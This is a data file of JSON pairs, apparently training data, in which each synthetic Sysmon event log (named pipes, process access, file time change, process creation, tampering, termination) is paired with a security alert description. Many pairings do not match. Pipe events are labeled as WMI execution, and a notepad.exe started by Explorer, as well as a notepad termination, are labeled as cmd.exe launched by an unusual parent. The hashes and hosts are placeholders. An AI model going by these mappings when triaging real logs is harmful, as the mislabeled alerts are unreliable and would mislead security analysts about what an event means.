{"{\"Event\": {\"@xmlns\": \"http://schemas.microsoft.com/win/2004/08/events/event\", \"System\": {\"Provider\": {\"@Name\": \"Microsoft-Windows-Sysmon\", \"@Guid\": \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"}, \"EventID\": \"18\", \"EventName\": \"PipeEvent (Pipe Connected)\", \"EventDescription\": \"This event logs when a named pipe connection is made between a client and a server.\", \"Version\": \"5\", \"Level\": \"4\", \"Task\": \"18\", \"Opcode\": \"0\", \"Keywords\": \"0x8000000000000000\", \"TimeCreated\": {\"@SystemTime\": \"2022-03-17T11:49:06.5589503Z\"}, \"EventRecordID\": \"12345\", \"Correlation\": null, \"Execution\": {\"@ProcessID\": \"1234\", \"@ThreadID\": \"5678\"}, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Computer\": \"mycomputer.example.com\", \"Security\": {\"@UserID\": \"S-1-5-18\"}}, \"EventData\": {\"Data\": [{\"@Name\": \"UtcTime\", \"#text\": \"2022-03-17 11:49:06.558\"}, {\"@Name\": \"PipeName\", \"#text\": \"\\\\\\\\.\\\\pipe\\\\mypipe\"}, {\"@Name\": \"PipeHandle\", \"#text\": \"0x1234\"}, {\"@Name\": \"ProcessGuid\", \"#text\": \"{12345678-1234-1234-1234-123456789012}\"}, {\"@Name\": \"ProcessId\", \"#text\": \"5678\"}, {\"@Name\": \"Image\", \"#text\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"}]}}}\n": "Alert Name: Windows Management Instrumentation Execution. - Key Characteristics: High, WMI, bypass traditional security controls. - Cybersecurity Alert Description: Attackers use WMI to execute commands or scripts on a system, bypassing traditional security controls. The endpoint affected is Defender and the executable file associated with this alert is wmiprvse.exe. Alert Name: Windows Management Instrumentation Threat. - Key Characteristics: Detects use of WMI for lateral movement or other malicious activities, process wmiprvse.exe and svchost.exe. - Cybersecurity Alert Description: This high-level threat alert detects the use of WMI for lateral movement or other malicious activities. The alert monitors the processes wmiprvse.exe and svchost.exe, which are commonly used by attackers to execute malicious code."}
{"{\"Event\": {\"@xmlns\": \"http://schemas.microsoft.com/win/2004/08/events/event\", \"System\": {\"Provider\": {\"@Name\": \"Microsoft-Windows-Sysmon\", \"@Guid\": \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"}, \"EventID\": \"17\", \"EventName\": \"PipeEvent (Pipe Created)\", \"EventDescription\": \"This event generates when a named pipe is created. Malware often uses named pipes for interprocess communication.\", \"Version\": \"5\", \"Level\": \"4\", \"Task\": \"17\", \"Opcode\": \"0\", \"Keywords\": \"0x8000000000000000\", \"TimeCreated\": {\"@SystemTime\": \"2023-04-16T08:30:00.000000Z\"}, \"EventRecordID\": \"12345\", \"Correlation\": null, \"Execution\": {\"@ProcessID\": \"1234\", \"@ThreadID\": \"5678\"}, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Computer\": \"examplecomputername\", \"Security\": {\"@UserID\": \"S-1-5-18\"}}, \"EventData\": {\"Data\": [{\"@Name\": \"RuleName\", \"#text\": \"Pipe Created Rule\"}, {\"@Name\": \"UtcTime\", \"#text\": \"2023-04-16 08:30:00.000\"}, {\"@Name\": \"PipeName\", \"#text\": \"\\\\\\\\.\\\\pipe\\\\examplepipe\"}, {\"@Name\": \"Image\", \"#text\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"}, {\"@Name\": \"CommandLine\", \"#text\": \"cmd.exe /c net use \\\\\\\\127.0.0.1\\\\exampleshare && copy \\\\\\\\127.0.0.1\\\\exampleshare\\\\file.txt \\\\\\\\.\\\\pipe\\\\examplepipe\"}, {\"@Name\": \"Hash\", \"#text\": \"ABCDEFG1234567890\"}, {\"@Name\": \"HashType\", \"#text\": \"SHA256\"}, {\"@Name\": \"PipeCreatorProcessGuid\", \"#text\": \"{01234567-89AB-CDEF-0123-456789ABCDEF}\"}, {\"@Name\": \"PipeCreatorProcessId\", \"#text\": \"1234\"}, {\"@Name\": \"PipeCreatorImage\", \"#text\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\"}]}}}\n": "Alert Name: Windows Management Instrumentation Execution. - Key Characteristics: High, WMI, bypass traditional security controls. - Cybersecurity Alert Description: Attackers use WMI to execute commands or scripts on a system, bypassing traditional security controls. The endpoint affected is Defender and the executable file associated with this alert is wmiprvse.exe. Alert Name: Windows Management Instrumentation Threat. - Key Characteristics: Detects use of WMI for lateral movement or other malicious activities, process wmiprvse.exe and svchost.exe. - Cybersecurity Alert Description: This high-level threat alert detects the use of WMI for lateral movement or other malicious activities. The alert monitors the processes wmiprvse.exe and svchost.exe, which are commonly used by attackers to execute malicious code."}
{"{\"Event\": {\"@xmlns\": \"http://schemas.microsoft.com/win/2004/08/events/event\", \"System\": {\"Provider\": {\"@Name\": \"Microsoft-Windows-Sysmon\", \"@Guid\": \"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"}, \"EventID\": \"10\", \"EventName\": \"ProcessAccess\", \"EventDescription\": \"The process accessed event reports when a process opens another process, an operation that\\u00e2\\u20ac\\u2122s often followed by information queries or reading and writing the address space of the target process. This enables detection of hacking tools that read the memory contents of processes like Local Security Authority (Lsass.exe) in order to steal credentials for use in Pass-the-Hash attacks.\", \"Version\": \"5\", \"Level\": \"4\", \"Task\": \"10\", \"Opcode\": \"0\", \"Keywords\": \"0x8000000000000000\", \"TimeCreated\": {\"@SystemTime\": \"2023-04-16T13:20:15.123456Z\"}, \"EventRecordID\": \"123456\", \"Correlation\": null, \"Execution\": {\"@ProcessID\": \"2080\", \"@ThreadID\": \"2084\"}, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Computer\": \"DESKTOP-EXAMPLE\", \"Security\": {\"@UserID\": \"S-1-5-18\"}}, \"EventData\": {\"Data\": [{\"@Name\": \"SourceProcessGuid\", \"#text\": \"{A1B2C3D4-E5F6-1234-5678-90ABCDEF1234}\"}, {\"@Name\": \"SourceProcessId\", \"#text\": \"1234\"}, {\"@Name\": \"SourceImage\", \"#text\": \"C:\\\\Windows\\\\System32\\\\source.exe\"}, {\"@Name\": \"TargetProcessGuid\", \"#text\": \"{B1C2D3E4-F5A6-2345-6789-01BCDEFA2345}\"}, {\"@Name\": \"TargetProcessId\", \"#text\": \"5678\"}, {\"@Name\": \"TargetImage\", \"#text\": \"C:\\\\Windows\\\\System32\\\\target.exe\"}, {\"@Name\": \"GrantedAccess\", \"#text\": \"0x1410\"}, {\"@Name\": \"CallTrace\", \"#text\": \"C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+9a574|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+1234abcd|C:\\\\Windows\\\\System32\\\\source.exe+12abcd\"}]}}}\n": "Alert Name: Inter-Process Communication Abuse. - Key Characteristics: IPC, local code execution, command execution, defense evasion, suspicious communication. - Cybersecurity Alert Description: Adversaries may exploit IPC mechanisms to execute local code or commands. A suspicious communication was detected between trusted processes, indicating possible defense evasion and command and control activity. Further investigation is recommended."}
{"{\"Event\": {\"@xmlns\": \"http://schemas.microsoft.com/win/2004/08/events/event\", \"System\": {\"Provider\": {\"@Name\": \"Microsoft-Windows-Sysmon\", \"@Guid\": \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"}, \"EventID\": \"2\", \"EventName\": \"A process changed a file creation time\", \"EventDescription\": \"The change file creation time event is registered when a file creation time is explicitly modified by a process. This event helps tracking the real creation time of a file. Attackers may change the file creation time of a backdoor to make it look like it was installed with the operating system.\", \"Version\": \"5\", \"Level\": \"4\", \"Task\": \"2\", \"Opcode\": \"0\", \"Keywords\": \"0x8000000000000000\", \"TimeCreated\": {\"@SystemTime\": \"2023-04-16T12:34:56.7890123Z\"}, \"EventRecordID\": \"12345\", \"Correlation\": null, \"Execution\": {\"@ProcessID\": \"4\", \"@ThreadID\": \"1234\"}, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Computer\": \"DESKTOP-EXAMPLE\", \"Security\": {\"@UserID\": \"S-1-5-18\"}}, \"EventData\": {\"Data\": [{\"@Name\": \"RuleName\", \"#text\": \"-\"}, {\"@Name\": \"UtcTime\", \"#text\": \"2023-04-16 12:34:56.7890123\"}, {\"@Name\": \"ProcessGuid\", \"#text\": \"{87A7A538-AB12-0000-001A-9A87-12ABCD123456}\"}, {\"@Name\": \"ProcessId\", \"#text\": \"1234\"}, {\"@Name\": \"Image\", \"#text\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"}, {\"@Name\": \"User\", \"#text\": \"DESKTOP-EXAMPLE\\\\Administrator\"}, {\"@Name\": \"TargetFilename\", \"#text\": \"C:\\\\Users\\\\Administrator\\\\Documents\\\\test.txt\"}, {\"@Name\": \"CreationUtcTime\", \"#text\": \"2023-04-16 12:34:50.1234567\"}, {\"@Name\": \"PreviousCreationUtcTime\", \"#text\": \"2023-04-16 12:30:00.0000000\"}]}}}\n": "Alert Name: A process changed a file creation time. - Key Characteristics: File creation time explicitly modified by a process, helps track real creation time of a file, attackers may change file creation time of a backdoor. - Cybersecurity Alert Description: This alert is triggered when a process modifies the creation time of a file. The purpose of this event is to track the actual creation time of a file. Attackers may change the file creation time of a backdoor to make it appear as if it was installed with the operating system."}
{"{\"Event\": {\"@xmlns\": \"http://schemas.microsoft.com/win/2004/08/events/event\", \"System\": {\"Provider\": {\"@Name\": \"Microsoft-Windows-Sysmon\", \"@Guid\": \"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"}, \"EventID\": \"1\", \"EventName\": \"Process creation\", \"EventDescription\": \"The process creation event provides extended information about a newly created process. The full command line provides context on the process execution.\", \"Version\": \"5\", \"Level\": \"4\", \"Task\": \"1\", \"Opcode\": \"0\", \"Keywords\": \"0x8000000000000000\", \"TimeCreated\": {\"@SystemTime\": \"2021-09-01T10:15:03.248345800Z\"}, \"EventRecordID\": \"12345\", \"Correlation\": null, \"Execution\": {\"@ProcessID\": \"1234\", \"@ThreadID\": \"5678\"}, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Computer\": \"DESKTOP-123456\", \"Security\": {\"@UserID\": \"S-1-5-18\"}}, \"EventData\": {\"Data\": [{\"@Name\": \"UtcTime\", \"#text\": \"2021-09-01 10:15:03.247\"}, {\"@Name\": \"ProcessGuid\", \"#text\": \"{86107A5D-EEF6-60C1-0000-001066F72900}\"}, {\"@Name\": \"ProcessId\", \"#text\": \"1234\"}, {\"@Name\": \"Image\", \"#text\": \"C:\\\\Windows\\\\system32\\\\notepad.exe\"}, {\"@Name\": \"FileVersion\", \"#text\": \"10.0.19041.1 (WinBuild.160101.0800)\"}, {\"@Name\": \"Description\", \"#text\": \"Notepad\"}, {\"@Name\": \"Product\", \"#text\": \"Microsoft\\u00c2\\u00ae Windows\\u00c2\\u00ae Operating System\"}, {\"@Name\": \"Company\", \"#text\": \"Microsoft Corporation\"}, {\"@Name\": \"OriginalFileName\", \"#text\": \"NOTEPAD.EXE\"}, {\"@Name\": \"CommandLine\", \"#text\": \"notepad.exe\"}, {\"@Name\": \"CurrentDirectory\", \"#text\": \"C:\\\\Windows\\\\system32\\\\\"}, {\"@Name\": \"User\", \"#text\": \"DESKTOP-123456\\\\Admin\"}, {\"@Name\": \"LogonGuid\", \"#text\": \"{86107A5D-EC59-60C1-0000-00203B090200}\"}, {\"@Name\": \"LogonId\", \"#text\": \"0x12345678\"}, {\"@Name\": \"TerminalSessionId\", \"#text\": \"1\"}, {\"@Name\": \"IntegrityLevel\", \"#text\": \"High\"}, {\"@Name\": \"Hashes\", \"#text\": \"SHA1=ABCD1234EFGH5678IJKL9012MNOP3456QRST7890\"}, {\"@Name\": \"ParentProcessGuid\", \"#text\": \"{86107A5D-EEDC-60C1-0000-00109A240100}\"}, {\"@Name\": \"ParentProcessId\", \"#text\": \"8888\"}, {\"@Name\": \"ParentImage\", \"#text\": \"C:\\\\Windows\\\\Explorer.EXE\"}, {\"@Name\": \"ParentCommandLine\", \"#text\": \"C:\\\\Windows\\\\Explorer.EXE\"}]}}}\n": "Alert Name: Unusual Parent Process. High. Command and Scripting Interpreter (T1059.003). - Key Characteristics: Suspicious parent-child process relationship with cmd.exe descending from an unusual process. - Cybersecurity Alert Description: The alert indicates the detection of a suspicious parent-child process relationship with cmd.exe descending from an unusual process. The alert is classified as high severity and falls under the Command and Scripting Interpreter (T1059.003) category. Alert Name: Command Interpreter Launched by Unusual Parent Process. - Key Characteristics: Custom command interpreter, malicious activity indicator, T1059.003. - Cybersecurity Alert Description: The system command interpreter (cmd.exe) was launched by a non-standard parent process, which could indicate the use of a custom command interpreter and potentially malicious activity. This alert falls under the T1059.003 category of Command and Scripting Interpreter and can be detected through EDR."}
{"{\"Event\": {\"@xmlns\": \"http://schemas.microsoft.com/win/2004/08/events/event\", \"System\": {\"Provider\": {\"@Name\": \"Microsoft-Windows-Sysmon\", \"@Guid\": \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"}, \"EventID\": \"25\", \"EventName\": \"ProcessTampering (Process image change)\", \"EventDescription\": \"This event is generated when process hiding techniques such as \\\"hollow\\\" or \\\"herpaderp\\\" are being detected.\", \"Version\": \"5\", \"Level\": \"Informational\", \"Task\": \"ProcessTampering\", \"Opcode\": \"Info\", \"Keywords\": \"0x8000000000000000\", \"TimeCreated\": {\"@SystemTime\": \"2023-04-16T08:30:00.000000Z\"}, \"EventRecordID\": \"123456\", \"Correlation\": null, \"Execution\": {\"@ProcessID\": \"1234\", \"@ThreadID\": \"5678\"}, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Computer\": \"COMPUTERNAME\", \"Security\": null}, \"EventData\": {\"Data\": [{\"@Name\": \"RuleName\", \"#text\": \"ProcessTampering\"}, {\"@Name\": \"UtcTime\", \"#text\": \"2023-04-16 08:30:00.000\"}, {\"@Name\": \"ProcessGuid\", \"#text\": \"{0f03650e-44d7-6215-0000-0010496e4200}\"}, {\"@Name\": \"ProcessId\", \"#text\": \"1000\"}, {\"@Name\": \"Image\", \"#text\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"}, {\"@Name\": \"FileVersion\", \"#text\": \"10.0.19041.1023 (WinBuild.160101.0800)\"}, {\"@Name\": \"Description\", \"#text\": \"Windows Command Processor\"}, {\"@Name\": \"CommandLine\", \"#text\": \"cmd.exe /c notepad.exe\"}, {\"@Name\": \"CurrentDirectory\", \"#text\": \"C:\\\\Temp\"}, {\"@Name\": \"User\", \"#text\": \"DOMAIN\\\\Username\"}, {\"@Name\": \"LogonGuid\", \"#text\": \"{26c1aa3d-96e2-7f60-0000-0020168d0f00}\"}, {\"@Name\": \"LogonId\", \"#text\": \"0x00000a58\"}, {\"@Name\": \"IntegrityLevel\", \"#text\": \"High\"}, {\"@Name\": \"Hashes\", \"#text\": \"MD5=de8429d206c4e0dc1c1496a5ea5e5c5a,SHA256=3f4d4ad6a9d547e77df1c84904c8d2cd2f238c62a346e44e8575088f22ec9b91\"}]}}}\n": "Alert Name: Unusual Parent Process. High. Command and Scripting Interpreter (T1059.003). - Key Characteristics: Suspicious parent-child process relationship with cmd.exe descending from an unusual process. - Cybersecurity Alert Description: The alert indicates the detection of a suspicious parent-child process relationship with cmd.exe descending from an unusual process. The alert is classified as high severity and falls under the Command and Scripting Interpreter (T1059.003) category. Alert Name: Command Interpreter Launched by Unusual Parent Process. - Key Characteristics: Custom command interpreter, malicious activity indicator, T1059.003. - Cybersecurity Alert Description: The system command interpreter (cmd.exe) was launched by a non-standard parent process, which could indicate the use of a custom command interpreter and potentially malicious activity. This alert falls under the T1059.003 category of Command and Scripting Interpreter and can be detected through EDR."}
{"{\"Event\": {\"@xmlns\": \"http://schemas.microsoft.com/win/2004/08/events/event\", \"System\": {\"Provider\": {\"@Name\": \"Microsoft-Windows-Sysmon\", \"@Guid\": \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"}, \"EventID\": \"5\", \"EventName\": \"Process terminated\", \"EventDescription\": \"The process terminate event reports when a process terminates. It provides the UtcTime, ProcessGuid and ProcessId of the process.\", \"Version\": \"5\", \"Level\": \"4\", \"Task\": \"5\", \"Opcode\": \"0\", \"Keywords\": \"0x8000000000000000\", \"TimeCreated\": {\"@SystemTime\": \"2023-04-16T12:34:56.7890123Z\"}, \"EventRecordID\": \"123456\", \"Correlation\": null, \"Execution\": {\"@ProcessID\": \"2596\", \"@ThreadID\": \"4560\"}, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Computer\": \"DESKTOP-EXAMPLE\", \"Security\": {\"@UserID\": \"S-1-5-18\"}}, \"EventData\": {\"Data\": [{\"@Name\": \"UtcTime\", \"#text\": \"2023-04-16 12:34:56.7890123\"}, {\"@Name\": \"ProcessGuid\", \"#text\": \"{9A9B9C9D-0000-1234-5678-0123456789AB}\"}, {\"@Name\": \"ProcessId\", \"#text\": \"4560\"}, {\"@Name\": \"Image\", \"#text\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"}, {\"@Name\": \"User\", \"#text\": \"DESKTOP-EXAMPLE\\\\user1\"}]}}}\n": "Alert Name: Unusual Parent Process. High. Command and Scripting Interpreter (T1059.003). - Key Characteristics: Suspicious parent-child process relationship with cmd.exe descending from an unusual process. - Cybersecurity Alert Description: The alert indicates the detection of a suspicious parent-child process relationship with cmd.exe descending from an unusual process. The alert is classified as high severity and falls under the Command and Scripting Interpreter (T1059.003) category. Alert Name: Command Interpreter Launched by Unusual Parent Process. - Key Characteristics: Custom command interpreter, malicious activity indicator, T1059.003. - Cybersecurity Alert Description: The system command interpreter (cmd.exe) was launched by a non-standard parent process, which could indicate the use of a custom command interpreter and potentially malicious activity. This alert falls under the T1059.003 category of Command and Scripting Interpreter and can be detected through EDR."}
